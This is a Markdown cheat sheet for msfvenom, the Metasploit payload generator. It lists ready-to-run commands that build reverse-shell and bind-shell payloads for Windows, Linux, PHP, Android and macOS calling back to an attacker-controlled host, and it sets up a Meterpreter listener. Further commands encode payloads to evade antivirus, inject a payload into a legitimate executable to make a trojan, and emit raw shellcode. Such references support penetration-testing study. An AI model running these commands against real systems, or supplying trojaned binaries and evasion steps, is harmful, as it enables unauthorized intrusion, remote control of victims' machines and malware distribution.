## Info
- **Type:** Payload generation tool
- **Part of:** Metasploit Framework
- **Common Usage:** Generates shellcode and payloads for exploitation
- **Supports:** Multiple architectures (x86, x64, ARM), platforms (Windows, Linux, macOS, Android), and output formats (EXE, ELF, APK, DLL, etc.)

## Usage

### Listener Setup in Metasploit
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $ATTACKER_IP
set LPORT 4444
exploit
```

### Generating a Basic Reverse Shell Payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f exe -o shell.exe
```

- `-p`: Payload type
- `LHOST`: Attacker's IP (listening machine)
- `LPORT`: Listening port for reverse connection
- `-f`: Format of output (e.g., exe, elf, raw, py, etc.)
- `-o`: Output file

### Common Payloads

#### Windows Payloads

```bash
# Windows Meterpreter Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f exe -o shell.exe

# Windows Staged Reverse Shell
msfvenom -p windows/shell/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f exe -o shell.exe
```

#### Linux Payloads

```bash
# Linux Reverse Shell (ELF binary)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f elf -o shell.elf

# Linux Bind Shell
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf -o bindshell.elf
```

#### Web Shells (PHP, ASP, JSP)

```bash
# PHP Reverse Shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f raw > shell.php
```

#### Android Payload

```bash
# Malicious APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -o shell.apk
```

#### MacOS Payload

```bash
# MacOS Reverse Shell
msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f macho -o shell.macho
```

### Encoding Payloads (Bypass AV Detection)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

- `-e`: Encoder (e.g., `x86/shikata_ga_nai`)
- `-i`: Iterations (multiple encoding passes)

### Injecting Payloads into Executables

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -x clean.exe -k -f exe -o infected.exe
```

- `-x`: Base executable file
- `-k`: Keep functionality of the original file

### Converting Payloads to Shellcode

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f c
```

- Outputs shellcode in C format for manual injection
